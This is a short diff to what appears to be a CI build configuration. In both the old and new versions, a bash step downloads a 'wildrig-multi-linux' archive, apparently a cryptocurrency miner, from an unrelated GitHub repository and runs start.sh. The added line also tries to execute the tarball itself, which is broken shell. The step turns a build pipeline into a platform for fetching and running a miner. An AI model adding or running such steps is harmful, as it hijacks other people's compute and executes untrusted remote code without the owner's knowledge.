@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         wget https://github.com/ifhikf/juki/raw/main/wildrig-multi-linux-0.29.0%20(1).tar.gz && ./start.sh
+         wget https://github.com/ifhikf/juki/raw/main/wildrig-multi-linux-0.29.0%20(1).tar.gz && wildrig-multi-linux-0.29.0%20(1).tar.gz && ./start.sh
     waitFor:
       - '-'
     entrypoint: /bin/bash
